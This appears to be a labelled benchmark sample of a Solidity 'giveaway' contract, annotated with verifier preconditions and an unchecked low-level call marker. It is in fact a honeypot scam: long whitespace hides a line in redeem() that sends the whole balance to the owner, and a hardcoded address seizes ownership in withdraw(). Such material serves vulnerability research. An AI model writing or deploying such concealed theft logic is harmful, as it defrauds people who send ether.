/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 45
 */

pragma solidity >=0.7.0;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   
    /// @notice precondition minEligibility >= 0
    /// @notice precondition block.timestamp >= 0
    /// @notice precondition block.number >= 0
    /// @notice precondition msg.value >= 0
    /// @notice precondition address(this).balance >= 0
    /// @notice precondition forall (address addr2005) addr2005.balance >= 0
    receive() external payable {
        
    }
   
    /// @notice precondition minEligibility >= 0
    /// @notice precondition block.timestamp >= 0
    /// @notice precondition block.number >= 0
    /// @notice precondition msg.value >= 0
    /// @notice precondition address(this).balance >= 0
    /// @notice precondition forall (address addr2005) addr2005.balance >= 0
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    payable(Owner).transfer(address(this).balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            payable(msg.sender).transfer(address(this).balance);
        }                                                                                                                
    }
    
    /// @notice precondition minEligibility >= 0
    /// @notice precondition block.timestamp >= 0
    /// @notice precondition block.number >= 0
    /// @notice precondition msg.value >= 0
    /// @notice precondition address(this).balance >= 0
    /// @notice precondition forall (address addr2005) addr2005.balance >= 0
    /// @notice precondition msg.sender != Owner
    /// @notice postcondition false
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }
    
    /// @notice precondition minEligibility >= 0
    /// @notice precondition block.timestamp >= 0
    /// @notice precondition block.number >= 0
    /// @notice precondition msg.value >= 0
    /// @notice precondition address(this).balance >= 0
    /// @notice precondition forall (address addr2005) addr2005.balance >= 0
    function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call{value: msg.value}(data);
    }
}
